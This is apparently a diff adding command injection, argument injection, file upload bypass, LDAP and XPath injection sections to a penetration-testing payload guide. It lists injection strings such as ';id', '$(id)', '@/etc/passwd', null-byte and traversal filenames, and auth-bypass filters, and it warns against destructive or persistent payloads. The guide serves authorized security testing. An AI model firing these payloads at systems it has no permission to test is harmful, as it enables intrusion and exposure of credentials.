@@ -385,6 +385,117 @@ username[$gt]=&password[$gt]=
 {"$where":"sleep(5000) || this.username == 'admin'"}
 ```
 
+## Command Injection
+
+Test command injection only where a feature plausibly reaches an OS command: diagnostics, image/video conversion, PDF generation, archive handling, ping/traceroute tools, Git/import jobs, file processing, backup tasks, or admin utilities.
+
+### Safe Detection Payloads
+
+Use harmless commands and callbacks:
+
+```text
+;id
+|id
+&& id
+`id`
+$(id)
+; whoami
+; sleep 5
+; ping -c 1 <callback-host>
+```
+
+Windows variants:
+
+```text
+& whoami
+| whoami
+&& timeout /T 5
+```
+
+Look for command output, timing deltas, DNS/HTTP callbacks, changed error messages, or stderr leakage.
+
+### Argument Injection
+
+When input becomes an argument to a safe command, shell metacharacters may be blocked but option injection may still work:
+
+```text
+--help
+--version
+-I
+@/etc/passwd
+```
+
+Examples include `curl`, `wget`, `tar`, `zip`, `convert`, `ffmpeg`, and `git` wrappers. Confirm impact with read-only flags before attempting command execution.
+
+Do not run destructive commands, persistence, reverse shells, or payloads that change host state unless explicitly authorized.
+
+## File Upload and Parser Abuse
+
+Test upload/import/export features as interpreter boundaries, not just extension checks.
+
+### Upload Bypass Classes
+
+```text
+avatar.php.jpg
+avatar.jpg.php
+avatar.PHP
+avatar.php%00.jpg
+avatar.jpg::$DATA
+avatar.svg
+avatar.html
+archive.zip with ../ traversal entry
+```
+
+Test:
+
+- MIME mismatch: image extension with script content or HTML/SVG content.
+- magic-byte mismatch: valid image header plus script body.
+- double extension and case variation.
+- executable upload path reachable from the web root.
+- SVG/HTML script execution in same origin.
+- ZIP/TAR extraction traversal and symlink handling.
+- filename XSS in list, admin, email, export, and log views.
+- parser metadata: EXIF, PDF metadata, XML inside Office files, malformed image chunks.
+
+Confirm only with safe proof: read the uploaded file, trigger a benign SVG/HTML alert in a test context, observe sanitized storage, or prove traversal against a harmless marker file.
+
+## LDAP and XPath Injection
+
+Test only where the app searches directories, SSO users, groups, XML documents, SOAP services, or authorization policies.
+
+### LDAP Payloads
+
+```text
+*
+*)(
+*)(uid=*
+admin)(&(password=*))
+admin)(|(uid=*))
+```
+
+Signals:
+
+- wildcard returns extra users
+- malformed filter error leaks LDAP syntax
+- boolean filter changes auth/search results
+- group membership or role lookup can be widened
+
+### XPath Payloads
+
+```text
+' or '1'='1
+" or "1"="1
+'] | //* | //*[contains('a','a
+```
+
+Signals:
+
+- login/search returns additional XML nodes
+- XML parser errors reveal XPath expressions
+- boolean true/false payloads change result count
+
+Use response differences and minimal data samples; do not enumerate directories broadly.
+
 ## Insecure Deserialization
 
 ### Indicators
